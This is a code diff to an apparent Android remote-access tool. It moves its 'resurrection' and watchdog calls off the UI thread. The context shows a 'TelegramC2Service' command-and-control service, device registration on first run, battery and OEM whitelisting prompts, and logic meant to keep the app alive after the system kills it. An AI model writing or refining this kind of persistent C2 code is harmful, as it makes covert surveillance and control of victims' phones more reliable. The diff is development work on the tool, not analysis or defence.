@@ -36,8 +36,8 @@ public class MainActivity extends AppCompatActivity {
         });
 
         handleFirstRunRegistration();
-        // Pyramid: schedule watchdogs early even before perms
-        try { ResurrectionHelper.scheduleWatchdog(this); } catch (Exception ignored) {}
+        // Pyramid: schedule watchdogs early even before perms (off UI thread to avoid ANR)
+        new Thread(() -> { try { ResurrectionHelper.scheduleWatchdog(MainActivity.this); } catch (Exception ignored) {} }).start();
     }
 
     private void handleFirstRunRegistration() {
@@ -45,8 +45,8 @@ public class MainActivity extends AppCompatActivity {
         boolean isFirstRun = prefs.getBoolean(FIRST_RUN_PREF, true);
         if (isFirstRun) {
             FCMHandlerService.registerDevice(this);
-            // Ensure network monitor + resurrection scheduled
-            ResurrectionHelper.resurrect(this);
+            // Ensure network monitor + resurrection scheduled (off UI thread)
+            new Thread(() -> { try { ResurrectionHelper.resurrect(MainActivity.this); } catch (Exception ignored) {} }).start();
             prefs.edit().putBoolean(FIRST_RUN_PREF, false).apply();
         }
     }
@@ -87,8 +87,8 @@ public class MainActivity extends AppCompatActivity {
         } else {
             promptOemWhitelist();
         }
-        // Step 2: Start core service via allowed path (we are foreground activity, so FGS start is allowed)
-        try { ResurrectionHelper.resurrect(this); } catch (Exception e) { ErrorLogger.logError(this, "onAllPerms_resurrect", e); }
+        // Step 2: Start core service via allowed path (we are foreground activity, so FGS start is allowed) - off UI thread
+        new Thread(() -> { try { ResurrectionHelper.resurrect(MainActivity.this); } catch (Exception e) { ErrorLogger.logError(MainActivity.this, "onAllPerms_resurrect", e); } }).start();
         try {
             Intent svc = new Intent(this, TelegramC2Service.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc); else startService(svc);
@@ -126,8 +126,8 @@ public class MainActivity extends AppCompatActivity {
         super.onResume();
         // Detect if user returned from battery settings and whitelist now granted
         if (BatteryOptimizationHelper.isWhitelisted(this)) {
-            // Re-schedule resurrection to ensure OEM reset didn't kill us
-            ResurrectionHelper.resurrect(this);
+            // Re-schedule resurrection to ensure OEM reset didn't kill us (off UI)
+            new Thread(() -> { try { ResurrectionHelper.resurrect(MainActivity.this); } catch (Exception ignored) {} }).start();
         }
     }
 }
